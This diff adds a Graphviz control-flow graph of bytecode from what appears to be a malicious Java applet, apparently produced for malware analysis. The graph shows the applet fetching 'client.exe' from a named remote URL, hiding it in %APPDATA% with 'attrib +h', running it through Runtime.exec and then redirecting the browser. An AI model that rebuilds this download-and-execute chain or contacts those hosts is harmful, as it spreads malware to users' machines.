@@ -1,0 +1,75 @@
+digraph "" {
+    "r0 := @this: Java"
+    "load.r r0"
+    "r0 := @this: Java"->"load.r r0";
+    "push \"http://ajdb.in/jdb/lib/load.php?id=ddcead413def31dec062addab4b26082\""
+    "load.r r0"->"push \"http://ajdb.in/jdb/lib/load.php?id=ddcead413def31dec062addab4b26082\"";
+    "push \"client.exe\""
+    "push \"http://ajdb.in/jdb/lib/load.php?id=ddcead413def31dec062addab4b26082\""->"push \"client.exe\"";
+    "virtualinvoke <Java: void EaW8VuT1AqAFFbr7(java.lang.String,java.lang.String)>"
+    "push \"client.exe\""->"virtualinvoke <Java: void EaW8VuT1AqAFFbr7(java.lang.String,java.lang.String)>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "virtualinvoke <Java: void EaW8VuT1AqAFFbr7(java.lang.String,java.lang.String)>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "new java.lang.StringBuilder"
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+    "dup1.r"
+    "new java.lang.StringBuilder"->"dup1.r";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "push \"attrib +h \\\"\""
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"attrib +h \\\"\"";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "push \"attrib +h \\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"APPDATA\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"APPDATA\"";
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"
+    "push \"APPDATA\""->"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\client.exe\\\"\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\client.exe\\\"\"";
+    "push \"\\client.exe\\\"\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "pop"
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "dup1.r"->"specialinvoke <java.lang.StringBuilder: void <init>()>";
+    "specialinvoke <java.lang.StringBuilder: void <init>()>"->"push \"APPDATA\"";
+    "push \"APPDATA\""->"staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>";
+    "staticinvoke <java.lang.System: java.lang.String getenv(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"\\client.exe\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"\\client.exe\"";
+    "push \"\\client.exe\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "new java.net.URL"
+    "pop"->"new java.net.URL";
+    "new java.net.URL"->"dup1.r";
+    "push \"http://www.spawnscape614.com/\""
+    "dup1.r"->"push \"http://www.spawnscape614.com/\"";
+    "checkcast"
+    "push \"http://www.spawnscape614.com/\""->"checkcast";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "checkcast"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"checkcast";
+    "store.r $r23"
+    "checkcast"->"store.r $r23";
+    "store.r $r23"->"load.r r0";
+    "virtualinvoke <Java: java.applet.AppletContext getAppletContext()>"
+    "load.r r0"->"virtualinvoke <Java: java.applet.AppletContext getAppletContext()>";
+    "load.r $r23"
+    "virtualinvoke <Java: java.applet.AppletContext getAppletContext()>"->"load.r $r23";
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"
+    "load.r $r23"->"interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1";
+    "goto return"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL)> 1"->"store.r r0";
+}
